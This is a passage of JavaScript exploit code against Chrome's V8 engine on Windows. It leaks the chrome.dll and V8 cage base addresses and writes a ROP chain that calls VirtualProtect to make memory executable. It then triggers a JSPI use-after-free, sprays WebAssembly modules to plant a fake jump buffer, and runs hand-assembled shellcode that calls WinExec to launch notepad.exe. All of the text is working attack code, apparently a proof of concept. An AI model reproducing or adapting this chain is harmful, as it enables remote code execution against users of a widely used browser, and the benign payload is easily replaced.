// rd32 / wr32: read/write a 32-bit value at a byte offset within a double array.

// source is an ExternalOneByteString.  Its resource_data pointer points into
// chrome.dll's .rdata section.  By temporarily extending the string's length,
// charCodeAt(offset) reads arbitrary bytes relative to that .rdata pointer:
//
//   +0x14b:    chrome.dll vtable pointer  -> subtract vtbl_rva -> BASE
//   +0x3dc42b: V8 cage base global        -> CAGE
//   +0x1d8323: _imp_VirtualProtect         -> VirtualProtect address

const sfi      = (r32(lt_addr + 0x10) - 1) >>> 0;  // SharedFunctionInfo
const script   = (r32(sfi + 0x14) - 1) >>> 0;       // Script
const ext_str  = (r32(script + 4) - 1) >>> 0;        // ExternalOneByteString

const ext_map = r32(ext_str);
if (ext_map !== 0x335) die('ext_str map unexpected: ' + hex(ext_map) + ' (expected 0x335)');

const orig_len = r32(ext_str + 8);
w32(ext_str + 8, 0x0fffffff);   // extend length for OOB read
const ext_obj = fakeObj(ext_str);

function readDword(offset) {
  let v = 0;
  for (let i = 0; i < 4; i++) v |= ext_obj.charCodeAt(offset + i) << (8 * i);
  return v >>> 0;
}

const vtbl_lo = readDword(EXT.vtbl_off);
const vtbl_hi = readDword(EXT.vtbl_off + 4);
const cage_lo = readDword(EXT.cage_off);
const cage_hi = readDword(EXT.cage_off + 4);
const vp_lo   = readDword(EXT.vp_off);
const vp_hi   = readDword(EXT.vp_off + 4);

w32(ext_str + 8, orig_len);     // restore original length

const BASE = (BigInt(vtbl_hi) << 32n | BigInt(vtbl_lo)) - BigInt(EXT.vtbl_rva);
const CAGE = BigInt(cage_hi) << 32n | BigInt(cage_lo);
const VP   = BigInt(vp_hi) << 32n | BigInt(vp_lo);

if ((BASE & 0xffffn) !== 0n || (CAGE & 0xffffffffn) !== 0n || !VP)
  die('ext_str leak sanity failed: BASE=' + BASE.toString(16)
      + ' CAGE=' + CAGE.toString(16) + ' VP=' + VP.toString(16));

log('[2a] BASE = 0x' + BASE.toString(16));
log('[2a] CAGE = 0x' + CAGE.toString(16));
log('[2a] VirtualProtect = 0x' + VP.toString(16));

// ============================================================================
//  STAGE 2b: ROP chain -> VirtualProtect -> RWX shellcode execution
// ============================================================================
//
// The holder array's FixedDoubleArray backing store lives in large-object space.
// We write the ROP chain into its element slots.  After the JSPI UAF in Stage 4,
// the fake jmpbuf pivots rsp into this FDA:
//
//   jmpbuf.pc = push_rsp_pop_rcx_ret  -> rcx = FDA page address
//   jmpbuf.sp = CAGE + FDA + 9        -> rsp lands at slot 1
//
// The chain calls VirtualProtect(rcx=FDA_page, 1, PAGE_EXECUTE_READWRITE, &bss)
// to make the page executable, then jumps into the shellcode written after it.
//
// Slot layout:
//   1:  pop rdx; ret         2:  1               (dwSize)
//   3:  pop r8;  ret         4:  0x40             (PAGE_EXECUTE_READWRITE)
//   5:  pop r9;  ret         6:  &a_bss           (lpflOldProtect scratch)
//   7:  VirtualProtect       8:  add rsp,0x20;ret (skip shadow space)
//   9-12: padding (shadow space)
//   13: jmp rsp              -> falls through to shellcode
//   14+: [mov r15, BASE; mov rsp, a_bss;] + shellcode bytes

const G = {};
for (const [k, rva] of Object.entries(ROP_GADGETS)) G[k] = BASE + rva;
G.vp = VP;

const dv = new DataView(new ArrayBuffer(8));
function setSlot(s, q) {
  dv.setBigUint64(0, (q & 0x00ffffffffffffffn) << 8n, true);
  holder[s - 1] = dv.getFloat64(0, true);
}

let R = 1;
setSlot(R + 0,  G.pop_rdx);          // pop rdx; ret
setSlot(R + 1,  1n);                  // rdx = dwSize = 1
setSlot(R + 2,  G.pop_r8);           // pop r8;  ret
setSlot(R + 3,  0x40n);              // r8  = PAGE_EXECUTE_READWRITE
setSlot(R + 4,  G.pop_r9);           // pop r9;  ret
setSlot(R + 5,  G.a_bss);            // r9  = scratch address for old-protect
setSlot(R + 6,  G.vp);               // VirtualProtect
setSlot(R + 7,  G.add_rsp_20_ret);   // skip shadow space after VP returns
for (let s = R + 8; s <= R + 11; s++) setSlot(s, 0n);  // shadow space padding
setSlot(R + 12, G.jmp_rsp);          // jump into shellcode

// Locate holder's FDA in the cage.
let H = r32(addrOf(holder) + 8) - 1;
if (r32(H) !== FDA_MAP) die('holder.elements not FDA (map = ' + hex(r32(H)) + ')');
rop_arg = fakeObj(H);

log('[2b] ROP chain at FDA ' + hex(H) + ', jmpbuf.sp = 0x' + (CAGE + BigInt(H) + 9n).toString(16));

// ============================================================================
//  STAGE 2c: arm the JSPI stale callback + fakeObj(TerminationException)
// ============================================================================
//
// Walk sp1's promise internals to extract the fulfill handler -- this is the
// callback that, after resolve1() and the cross-suspender throw, will try to
// resume from the (freed) StackMemory's jmpbuf.  We'll reclaim that memory
// with our fake jmpbuf before calling it.

let rc = r32(addrOf(sp1) + kJSPromise_reactions);
if ((rc & 1) === 0) die('sp1 has no reaction chain');
stale_cb = fakeObj(r32(rc - 1 + kPromiseReaction_fulfill) - 1);
term_ex_holder = fakeObj(TERM_EX);

// -- Clean up: restore spray, neutralize cT ----------------------------------
// cT is no longer needed.  Restore the spray elements to valid HeapNumber maps
// and null out the cell triplet variables so GC won't trace stale pointers.
(function() {
  let k = found_k;
  pool[s_found][k] = V515; pool[s_found][k+1] = V515;
  if (align) pool[s_found][k+2] = V515;
  for (let s = 0; s < NSPRAY; s++) {
    spray[s][k] = V515; spray[s][k+1] = V515;
    if (align) spray[s][k+2] = V515;
  }
  for (let s = 0; s < NCHURN; s++) {
    spray2[s][k] = V515; spray2[s][k+1] = V515;
    if (align) spray2[s][k+2] = V515;
  }
})();
cT = 0; cD1 = 0; cD2 = 0; cD3 = 0;
obj_arr[0] = obj_sentinel;

log('[2c] stale callback + TerminationException armed');
(function() { let j = 0; for (let i = 0; i < 8000000; i++) j += i; })();

// ============================================================================
//  STAGE 3: resolve the suspended promise -> cross-suspender throw -> UAF
// ============================================================================
//
// resolve1() resumes the Wasm suspender.  The resumed code calls throw(), which
// throws fakeObj(TerminationException) across the suspender boundary.  V8's
// cross-suspender unwind frees the secondary StackMemory -- but the promise
// reaction's fulfill handler still references the freed jmpbuf.

log('[3] resolving sp1 -- StackMemory will be freed by cross-suspender unwind');
resolve1();

// ============================================================================
//  STAGE 4: reclaim StackMemory, write shellcode, fire stale callback
// ============================================================================
//
// We need one async yield so the event loop turns and the StackMemory is
// actually freed by GC.  Then we spray WebAssembly.Module objects (whose
// custom sections are exactly kSM_size bytes) to reclaim the freed memory
// with our fake jmpbuf.  Calling stale_cb() triggers LoadJumpBuffer on
// the reclaimed memory -- pivoting rsp to our ROP chain.

log('[4] waiting ' + WAIT_MS + 'ms for GC to free StackMemory...');

// The shellcode: resolve WinExec via chrome.dll IAT -> WinExec("notepad.exe",1).
// See payload.asm for source; hand-assembled for portability (no nasm needed).
const SHELLCODE = new Uint8Array([
  0x49,0x89,0xE6,                                          // mov r14, rsp
  0x48,0x81,0xEC,0x00,0x08,0x00,0x00,                      // sub rsp, 0x800
  0x48,0x83,0xE4,0xF0,                                     // and rsp, -16
  0x49,0x8D,0x8F,0xF2,0xD5,0xD8,0x0F,                      // lea rcx, [r15+KERNEL32]
  0x49,0x8B,0x87,0xC8,0xA0,0xD8,0x0F,                      // mov rax, [r15+GetModuleHandleA]
  0x48,0x83,0xEC,0x20,0xFF,0xD0,0x48,0x83,0xC4,0x20,       // shadow call rax
  0x48,0x89,0xC1,                                           // mov rcx, rax (hKernel32)
  0x48,0xBA,0x57,0x69,0x6E,0x45,0x78,0x65,0x63,0x00,       // mov rdx, "WinExec\0"
  0x49,0x89,0x96,0x70,0x01,0x00,0x00,                       // mov [r14+0x170], rdx
  0x49,0x8D,0x96,0x70,0x01,0x00,0x00,                       // lea rdx, [r14+0x170]
  0x49,0x8B,0x87,0x30,0xA1,0xD8,0x0F,                      // mov rax, [r15+GetProcAddress]
  0x48,0x83,0xEC,0x20,0xFF,0xD0,0x48,0x83,0xC4,0x20,       // shadow call rax
  0x49,0x89,0xC3,                                           // mov r11, rax (WinExec)
  0x48,0xB8,0x6E,0x6F,0x74,0x65,0x70,0x61,0x64,0x2E,       // mov rax, "notepad."
  0x49,0x89,0x86,0x78,0x01,0x00,0x00,                       // mov [r14+0x178], rax
  0x41,0xC7,0x86,0x80,0x01,0x00,0x00,0x65,0x78,0x65,0x00,  // mov dword [r14+0x180], "exe\0"
  0x49,0x8D,0x8E,0x78,0x01,0x00,0x00,                       // lea rcx, [r14+0x178]
  0xBA,0x01,0x00,0x00,0x00,                                 // mov edx, 1
  0x4C,0x89,0xD8,                                           // mov rax, r11
  0x48,0x83,0xEC,0x20,0xFF,0xD0,0x48,0x83,0xC4,0x20,       // shadow call rax -> WinExec
  0x0F,0x0B,                                                // ud2 (kill tab)
]);

(async () => {
  // Yield to the event loop -- this is critical.  resolve1() only *scheduled*
  // the JSPI resumption as a microtask.  The StackMemory is not freed until
  // the event loop actually runs that microtask and the cross-suspender throw
  // completes.  A busy-wait here (no yield) would mean the memory is never
  // freed and the reclaim spray finds nothing.
  await new Promise(r => setTimeout(r, WAIT_MS));

  // Write shellcode into holder[] starting at slot R+12 (after jmp_rsp).
  // The JS prefix sets r15 = chrome_base and rsp = a_bss before the payload.
  function imm64(b, q) {
    for (let i = 0; i < 8; i++) { b.push(Number(q & 0xffn)); q >>= 8n; }
  }
  let SC = [0x49, 0xbf]; imm64(SC, BASE);                    // mov r15, BASE
  SC.push(0x48, 0xb8);   imm64(SC, G.a_bss); SC.push(0x48, 0x89, 0xc4); // mov rsp, a_bss
  for (let i = 0; i < SHELLCODE.length; i++) SC.push(SHELLCODE[i]);

  let hi = R + 12;
  dv.setBigUint64(0, 0n, true);
  for (let j = 0; j < 7 && j < SC.length; j++) dv.setUint8(1 + j, SC[j]);
  holder[hi++] = dv.getFloat64(0, true);
  for (let off = 7; off < SC.length; off += 8) {
    dv.setBigUint64(0, 0n, true);
    for (let j = 0; j < 8 && off + j < SC.length; j++) dv.setUint8(j, SC[off + j]);
    holder[hi++] = dv.getFloat64(0, true);
  }
  log('[4] shellcode: ' + SHELLCODE.length + 'B payload -> holder[' + (R+12) + '..' + hi + ']');

  // Reclaim the freed StackMemory.
  // Each WebAssembly.Module with a custom section of exactly kSM_size bytes
  // allocates a buffer that V8's allocator may place in the freed slot.
  // The custom section contains our fake jmpbuf with sp/pc pointing at the
  // ROP chain in holder.
  const SP = CAGE + BigInt(H) + 9n;
  const FP = G.a_bss;
  const PC = G.pushrsp_rcx;

  function makeFakeStackMemory(idx) {
    let b = new Uint8Array(kSM_size);
    let d = new DataView(b.buffer);
    b.set([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0], 0);  // Wasm magic + version
    b[8] = 0; b[9] = 0xA5; b[10] = 1; b[11] = 0;   // custom section header
    d.setBigUint64(0x18, SP, true);   // jmpbuf.sp  -> ROP chain in FDA
    d.setBigUint64(0x20, FP, true);   // jmpbuf.fp  -> a_bss
    d.setBigUint64(0x28, PC, true);   // jmpbuf.pc  -> push rsp; pop rcx; ret
    d.setUint32(0x44, 1, true);       // state = active
    d.setBigUint64(0x38, 0n, true);   // parent = null
    d.setUint8(0x40, 0);              // is_on_central = false
    d.setUint32(kSM_size - 4, idx, true);
    return b;
  }

  const N_PRESS = 16, N_MOD = 2048;
  let bufs = new Array(N_MOD);
  for (let i = 0; i < N_MOD; i++) bufs[i] = makeFakeStackMemory(i);

  let mods = new Array(N_MOD), pressure = new Array(N_PRESS), m = 0;
  log('[4] spraying ' + N_MOD + ' WasmModules (' + kSM_size + 'B each) to reclaim StackMemory');
  for (let i = 0; i < N_PRESS; i++) {
    try { pressure[i] = new ArrayBuffer(256 * 1024 * 1024); } catch (e) {}
    for (let j = 0; j < 128 && m < N_MOD; j++, m++)
      mods[m] = new WebAssembly.Module(bufs[m]);
  }

  void holder.length;  // prevent holder from being GC'd

  log('[4] firing stale callback -> jmpbuf pivot -> ROP -> VirtualProtect -> shellcode');
  log('----------------------------------------------------------------');

  try {
    stale_cb(rop_arg);
    log('[-] callback returned -- StackMemory reclaim missed (retry)');
  } catch (e) {
    log('[!] exception: ' + ((e && e.stack) || e));
  }
})();
</script>
